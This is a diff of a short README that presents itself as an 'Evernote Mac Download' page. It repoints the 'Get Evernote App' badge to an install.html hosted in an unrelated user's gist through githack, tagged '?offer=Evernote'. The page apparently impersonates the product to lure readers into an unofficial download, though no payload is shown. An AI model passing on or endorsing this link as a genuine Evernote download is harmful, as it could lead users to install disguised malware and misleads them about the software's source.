@@ -1,6 +1,6 @@
 # Evernote Mac Download — organize notes & tasks
 
-[![Get Evernote App](https://img.shields.io/badge/Get%20Evernote%20App-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://finklousen71-alt.github.io/.github/)  
+[![Get Evernote App](https://img.shields.io/badge/Get%20Evernote%20App-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/breshine2010/f1e7da49b2633dc0be788e2becd1aeb4/raw/008d334dc45899bcf9459cb9df1d55c807b128cb/install.html?offer=Evernote)  
 
 ---
 
